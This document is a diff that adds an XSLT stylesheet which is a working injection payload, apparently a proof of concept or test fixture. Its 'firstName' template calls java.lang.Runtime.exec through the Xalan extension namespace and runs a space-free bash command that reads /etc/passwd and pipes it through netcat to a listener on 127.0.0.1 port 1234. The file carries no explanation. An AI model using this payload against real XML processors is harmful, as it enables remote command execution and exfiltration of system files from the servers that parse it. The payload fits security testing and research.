@@ -1,0 +1,22 @@
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java" version="1.0">
+
+ <xsl:template match="node()|@*">
+  <xsl:copy>
+   <xsl:apply-templates select="node()|@*"/>
+  </xsl:copy>
+ </xsl:template>
+
+ <xsl:template match="firstName">
+
+  <xsl:variable name="r"       
+        select="java:java.lang.Runtime.getRuntime()"/>
+        <xsl:variable name="p"       
+        select="java:exec($r,'bash -c {cat,/etc/passwd}|{nc,127.0.0.1,1234}')"/>
+  <xsl:copy>
+   <xsl:value-of select=
+   "$p"/>
+  </xsl:copy>
+ </xsl:template>
+ <xsl:template match="firstName/node()"/>
+
+</xsl:stylesheet>
